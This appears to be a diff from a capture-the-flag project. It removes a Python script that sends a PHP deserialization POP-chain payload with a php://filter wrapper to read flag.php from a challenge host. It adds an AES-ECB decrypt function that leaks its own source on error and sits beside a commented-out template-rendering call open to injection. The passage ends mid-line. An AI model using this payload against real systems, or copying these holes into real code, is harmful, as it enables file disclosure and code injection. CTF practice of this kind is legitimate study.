@@ -1,7 +1,15 @@
-import requests
-import base64
-
-url = "http://cdea37fa-946d-4a30-ba61-f907eb74cedd.node5.buuoj.cn:81/?pop="
-payload = 'O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:9:"index.php";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"\00*\00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}'
-res = requests.get(url + payload)
-print(base64.b64decode(res.text))
+def decrypt(text):
+    """
+    # 此函数将在如下代码执行时进行调用
+    path = request.path.strip('/')
+    解密路径
+    decrypted_path = decrypt(path.encode())
+    """
+    cipher = AES.new(key, AES.MODE_ECB)
+    try:
+        decrypted_text = cipher.decrypt(binascii.unhexlify(text))
+        return decrypted_text.rstrip(b' ').decode()
+    except Exception as e:
+        source_code = inspect.getsource(decrypt)
+        # return render_template_string(f"Error: {str(e)}Decrypt function source code:%s " %  source_code)
+        error_message = f"Error: {str(e)}
